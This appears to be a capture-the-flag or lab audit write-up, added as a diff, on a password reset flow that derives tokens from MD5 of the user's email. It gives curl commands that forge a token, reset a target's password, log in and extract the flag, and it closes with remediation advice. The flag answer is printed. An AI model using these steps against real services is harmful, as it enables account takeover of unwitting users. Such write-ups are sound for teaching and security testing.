@@ -1,0 +1,117 @@
+# Breach 02 — Insecure Password Reset (MD5 Token)
+
+## Flag
+`FLAG{r3s3t_t0k3n_w4s_just_md5_lol}`
+
+## Severity
+CRITICAL
+
+## CWE
+CWE-640: Weak Password Recovery Mechanism for Forgotten Password
+CWE-916: Use of Password Hash With Insufficient Computational Effort (MD5)
+
+## OWASP
+A07:2021 – Identification and Authentication Failures
+
+## What it is
+The platform's "forgot password" flow issues a reset token that is derived directly from
+the user's email address via MD5: `token = MD5(email)`. MD5 is not a secret — it is a
+deterministic, publicly documented hash function that anyone can compute in milliseconds
+with no key. The token is also passed as a plain URL query parameter, where it is visible
+in browser history, proxy logs, and server access logs.
+
+A forum post by `benjamin` (discovered during reconnaissance) confirmed this design
+explicitly:
+> "I used the password reset last night and used the reset token instantly — no email,
+>  the token was just... there in the URL."
+
+This means any attacker who knows a target's email address (trivially obtained from
+the platform's profile pages or forum posts) can reset that account's password without
+the real owner's involvement, with no email access required, and with no rate limiting
+to slow them down.
+
+## How it works
+
+### Step 1: Obtain target email
+Emails are visible on profile pages (readable via the IDOR breach) and in forum posts.
+For this demonstration: `benjamin@student.42.tech`
+
+### Step 2: Compute the reset token
+```bash
+echo -n "benjamin@student.42.tech" | md5sum
+# f1640a02eeccb971463836da7300b3ba
+```
+This is all an attacker needs — the token is derived entirely from public information.
+
+### Step 3: Access the reset form directly with the forged token
+```bash
+curl -s "http://localhost:4942/reset-password?token=f1640a02eeccb971463836da7300b3ba" \
+  | grep -A 5 "form"
+```
+The server returns a fully valid password-reset form pre-populated with the token.
+No email was sent. No ownership of the email account was verified.
+
+### Step 4: Set a new password
+```bash
+curl -s -X POST http://localhost:4942/reset-password/confirm \
+  -d "email=benjamin@student.42.tech&token=f1640a02eeccb971463836da7300b3ba&new_password=hacked123"
+```
+Empty response = success (302 redirect, password changed).
+
+### Step 5: Login with the new password
+```bash
+curl -s -c /tmp/benjamin_cookies.txt -X POST http://localhost:4942/login \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data 'identity=benjamin@student.42.tech&password=hacked123'
+```
+
+### Step 6: Retrieve the flag from the account recovery code
+```bash
+curl -s -b /tmp/benjamin_cookies.txt http://localhost:4942/profile/me/settings \
+  | grep -oE 'FLAG\{[^}]+\}'
+```
+Result:
+
+FLAG{r3s3t_t0k3n_w4s_just_md5_lol}
+
+
+The flag is stored in the "Account recovery code" field, visible in profile settings
+after gaining access to the account.
+
+## Flag Location
+- **Account:** benjamin@student.42.tech
+- **Page:** `/profile/me/settings`
+- **Field:** "Account recovery code" section
+- **Access:** Requires the reset-and-login steps above (no prior knowledge of
+  benjamin's real password needed)
+
+## Impact
+- Complete account takeover for **any** platform user whose email is known — and emails
+  are publicly visible throughout the platform (profiles, forum, staff dashboard).
+- No email access, no social engineering, no brute force required — the attacker
+  computes the token offline in milliseconds.
+- Affects every account on the platform equally: student, staff, and god-role accounts
+  alike. An attacker can reset the `sophie@42.tech` (god role) account just as easily
+  as any student account.
+- The compromised account's real owner is silently locked out — their password has
+  changed with no notification, no confirmation email, no audit trail.
+- Chains directly into every subsequent breach in this audit that requires an
+  authenticated starting point: once any account is compromised via this reset, the
+  attacker has a valid session to carry into the Mass Assignment, XXE, and PocketBase
+  breaches.
+
+## How it could have been avoided (remediation)
+- Generate reset tokens using a cryptographically secure random source
+  (`secrets.token_urlsafe(32)` in Python), not from any deterministic function of
+  the user's email. A 32-byte random token has ~256 bits of entropy — unguessable
+  even with a full brute-force attack.
+- Store only a hashed form of the token in the database (e.g. `SHA-256(token)`);
+  compare incoming tokens against the hash rather than storing the raw token,
+  so a database breach does not immediately yield usable reset links.
+- Send the token exclusively via the registered email address, and verify ownership
+  before accepting a password change. The current flow accepts a token submitted
+  directly to the confirm endpoint without any proof that the email was received.
+- Expire tokens after a short window (15–30 minutes) and invalidate them immediately
+  after first use, so a token intercepted from logs or history cannot be replayed.
+- Rate-limit `/reset-password/request` per IP and per email address to prevent
+  automated enumeration of valid accounts and token pre-computation at scale.
